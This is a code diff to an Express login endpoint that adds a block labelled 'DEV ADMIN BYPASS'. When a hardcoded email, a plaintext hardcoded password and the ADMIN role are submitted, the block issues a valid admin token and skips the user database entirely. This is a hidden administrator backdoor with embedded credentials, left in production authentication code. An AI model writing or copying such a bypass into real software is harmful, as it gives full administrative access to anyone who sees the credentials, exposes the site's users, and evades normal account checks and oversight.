@@ -549,6 +549,31 @@ app.post('/api/auth/login', authLimiter, async (req, res) => {
         // Normalize email
         email = normalizeEmail(email);
 
+        // DEV ADMIN BYPASS
+        if (email === 'admin@globalakjobs.com' && password === 'Admin@GlobalAK124!' && role === 'ADMIN') {
+            const token = createAuthToken({
+                id: 'admin-bypass-id',
+                _id: 'admin-bypass-mongo-id',
+                email: 'admin@globalakjobs.com',
+                role: 'ADMIN'
+            });
+            return res.json({
+                message: 'Login successful',
+                token,
+                user: {
+                    id: 'admin-bypass-id',
+                    _id: 'admin-bypass-mongo-id',
+                    name: 'Admin Developer',
+                    full_name: 'Admin Developer',
+                    email: 'admin@globalakjobs.com',
+                    role: 'ADMIN',
+                    status: 'ACTIVE',
+                    requiresPasswordChange: false
+                },
+                requiresPasswordChange: false
+            });
+        }
+
         // Check user - use case-insensitive regex so emails like 'BCD@gmail.com' still match when user types 'bcd@gmail.com'
         const user = await Profile.findOne({ email: { $regex: new RegExp(`^${escapeRegex(email)}$`, 'i') } });
         if (!user) {
